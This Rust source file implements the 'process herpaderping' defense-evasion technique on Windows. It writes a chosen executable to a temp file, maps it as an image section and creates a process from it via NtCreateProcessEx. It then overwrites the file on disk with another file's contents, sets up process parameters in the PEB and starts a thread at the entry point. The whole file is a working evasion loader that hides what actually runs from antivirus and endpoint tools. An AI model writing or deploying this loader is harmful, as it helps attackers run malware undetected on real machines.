use std::{
    fs::OpenOptions,
    io::{self, Write},
    panic,
    ptr::null_mut,
};
use ntapi::{
    ntmmapi::{NtAllocateVirtualMemory, NtCreateSection, NtReadVirtualMemory, NtWriteVirtualMemory},
    ntpebteb::PEB,
    ntpsapi::*,
    ntrtl::*,
};
use widestring::U16CString;
use winapi::{
    ctypes::c_void,
    shared::ntdef::{HANDLE, NT_SUCCESS, UNICODE_STRING},
    um::{
        fileapi::{CreateFileW, FlushFileBuffers, GetTempFileNameW, SetEndOfFile, WriteFile, OPEN_EXISTING},
        handleapi::CloseHandle,
        processthreadsapi::GetProcessId,
        userenv::CreateEnvironmentBlock,
        winnt::*,
    },
};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() != 4 {
        panic!("Usage: process_herpaderping.exe <file.exe> <args> <file-path>")
    }

    let buffer = std::fs::read(&args[1])?;
    let dir_temp = U16CString::from_str(std::env::temp_dir().to_str().unwrap())?;
    let prefix = U16CString::from_str("TT")?;
    let mut temp_file_name: Vec<u16> = vec![0; 256];

    unsafe { GetTempFileNameW(dir_temp.as_ptr(), prefix.as_ptr(), 0, temp_file_name.as_mut_ptr()) };

    let file = String::from_utf16(&temp_file_name).unwrap();
    let path_nt = format!(r"{}", file.trim_matches('\0'));
    println!("[+] PATH TEMP: {}", path_nt);

    create_section_file(path_nt, buffer, dir_temp.to_string().unwrap(), &args[2], &args[3])?;

    Ok(())
}

fn create_section_file(
    path_temp: String, 
    buffer: Vec<u8>, 
    dir_temp: String, 
    args: &String, 
    file_path: &String
) -> Result<(), Box<dyn std::error::Error>> {

    let mut dest_file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(&path_temp)?;

    dest_file.write_all(&buffer)?;
    dest_file.flush()?;

    let path_name = U16CString::from_str(&path_temp).unwrap();
    let h_file = unsafe {
        CreateFileW(
            path_name.as_ptr() as _,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        )
    };

    if h_file.is_null() {
        panic!("[!] CreateFileW Failed");
    }

    let mut h_section = null_mut();
    let mut status = unsafe {
        NtCreateSection(
            &mut h_section,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            h_file,
        )
    };

    if !NT_SUCCESS(status) {
        panic!("[!] NtCreateSection Failed With Status: {}", status);
    }

    let mut h_process = null_mut();
    status = unsafe {
        NtCreateProcessEx(
            &mut h_process,
            PROCESS_ALL_ACCESS,
            null_mut(),
            NtCurrentProcess,
            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
            h_section,
            null_mut(),
            null_mut(),
            0,
        )
    };

    if !NT_SUCCESS(status) {
        panic!("[!] NtCreateProcessEx Failed With Status: {}", status);
    }

    unsafe { println!("[+] Process Herpaderping PID: {}", GetProcessId(h_process)) }
    unsafe { CloseHandle(h_section) };

    process_herpaderping(h_file, file_path)?;

    let base_address = init_params(h_process, path_temp, dir_temp, args)?;
    let address_entrypoint = search_entrypoint(&buffer)?;
    let entry_point = ((base_address as usize) + address_entrypoint) as *mut c_void;

    let mut h_thread = null_mut();
    status = unsafe {
        NtCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            null_mut(),
            h_process,
            entry_point,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        )
    };

    if !NT_SUCCESS(status) {
        panic!("[!] NtCreateThreadEx Failed With Status: {}", status);
    }

    Ok(())
}

fn process_herpaderping(h_file: HANDLE, file_path: &String) -> io::Result<()> {
    let buffer = std::fs::read(format!("{file_path}"))?; // aitstatic
    let mut number_of_write = 0;
    unsafe {
        WriteFile(
            h_file,
            buffer.as_ptr() as _,
            buffer.len() as u32,
            &mut number_of_write,
            null_mut(),
        )
    };
    unsafe { FlushFileBuffers(h_file) };
    unsafe { SetEndOfFile(h_file) };

    Ok(())
}

///
/// Updating RTL_USER_PROCESS_PARAMETERS to start the process correctly
///
fn init_params(
    h_process: HANDLE,
    path_temp: String,
    dir_temp: String,
    args: &String
) -> Result<*mut c_void, String> {
    let command_line = U16CString::from_str(format!("{path_temp} {args}")).unwrap();
    let current_directory = U16CString::from_str(dir_temp).unwrap();
    let image_path = U16CString::from_str(path_temp).unwrap();

    let mut user_proc_params: PRTL_USER_PROCESS_PARAMETERS = unsafe { std::mem::zeroed() };
    let mut process_basic_information: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let mut peb: PEB = unsafe { std::mem::zeroed() };

    let mut enviroment = null_mut();
    unsafe { CreateEnvironmentBlock(&mut enviroment, null_mut(), 1) };

    let mut u_command_line: UNICODE_STRING = unsafe { std::mem::zeroed() };
    let mut u_current_directory: UNICODE_STRING = unsafe { std::mem::zeroed() };
    let mut u_image_path: UNICODE_STRING = unsafe { std::mem::zeroed() };

    unsafe {
        RtlInitUnicodeString(&mut u_command_line, command_line.as_ptr());
        RtlInitUnicodeString(&mut u_current_directory, current_directory.as_ptr());
        RtlInitUnicodeString(&mut u_image_path, image_path.as_ptr());
    };

    let mut status = unsafe {
        RtlCreateProcessParametersEx(
            &mut user_proc_params,
            &mut u_image_path,
            null_mut(),
            &mut u_current_directory,
            &mut u_command_line,
            enviroment,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] RtlCreateProcessParametersEx Failed With Status: {status}"));
    }

    status = unsafe {
        NtQueryInformationProcess(
            h_process,
            ProcessBasicInformation,
            &mut process_basic_information as *mut _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut(),
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtQueryInformationProcess Failed With Status: {status}"));
    }

    status = unsafe {
        NtReadVirtualMemory(
            h_process,
            process_basic_information.PebBaseAddress as *mut c_void,
            &mut peb as *mut _ as *mut c_void,
            std::mem::size_of::<PEB>(),
            null_mut(),
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtReadVirtualMemory Failed With Status: {status}"));
    }

    println!("[+] Address PEB: {:?}", process_basic_information.PebBaseAddress);

    let mut user_proc_base = user_proc_params as usize;
    let mut user_proc_end = unsafe { (user_proc_params as usize) + (*user_proc_params).Length as usize };
    unsafe {
        if !(*user_proc_params).Environment.is_null() {
            if user_proc_params as usize > (*user_proc_params).Environment as usize {
                user_proc_base = (*user_proc_params).Environment as usize;
            }

            if ((*user_proc_params).Environment as usize) + (*user_proc_params).EnvironmentSize > user_proc_end {
                user_proc_end = ((*user_proc_params).Environment as usize) + (*user_proc_params).EnvironmentSize;
            }
        }
    }

    let mut size_param = user_proc_end - user_proc_base;
    let mut base_address = user_proc_params as *mut c_void;

    status = unsafe {
        NtAllocateVirtualMemory(
            h_process,
            &mut base_address,
            0,
            &mut size_param,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtAllocateVirtualMemory Failed With Status: {status}"));
    }

    let mut number_of_write = 0;
    status = unsafe {
        NtWriteVirtualMemory(
            h_process,
            user_proc_params as *mut c_void,
            user_proc_params as *mut c_void,
            (*user_proc_params).Length as usize,
            &mut number_of_write,
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtWriteVirtualMemory Failed With Status: {status}"));
    }

    unsafe {
        if !(*user_proc_params).Environment.is_null() {
            status = NtWriteVirtualMemory(
                h_process,
                (*user_proc_params).Environment,
                (*user_proc_params).Environment,
                (*user_proc_params).EnvironmentSize,
                &mut number_of_write,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("[!] NtWriteVirtualMemory [2] Failed With Status: {status}"));
            }
        }

        let peb_base_address: *mut PEB = process_basic_information.PebBaseAddress;
        let remote_process_parameters_address = &mut (*peb_base_address).ProcessParameters as *mut *mut RTL_USER_PROCESS_PARAMETERS as *mut c_void;

        status = NtWriteVirtualMemory(
            h_process,
            remote_process_parameters_address,
            &user_proc_params as *const _ as *mut c_void,
            std::mem::size_of::<*mut c_void>(),
            &mut number_of_write,
        );

        if !NT_SUCCESS(status) {
            return Err(format!("[!] NtWriteVirtualMemory [3] Failed With Status: {status}"));
        }
    }

    Ok(peb.ImageBaseAddress)
}

fn search_entrypoint(buffer: &[u8]) -> Result<usize, String> {
    unsafe {
        let dos_header = buffer.as_ptr() as *mut IMAGE_DOS_HEADER;
        let nt_header = (dos_header as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            return Err("[!] IMAGE NT SIGNATURE INVALID".to_string());
        }

        Ok((*nt_header).OptionalHeader.AddressOfEntryPoint as usize)
    }
}
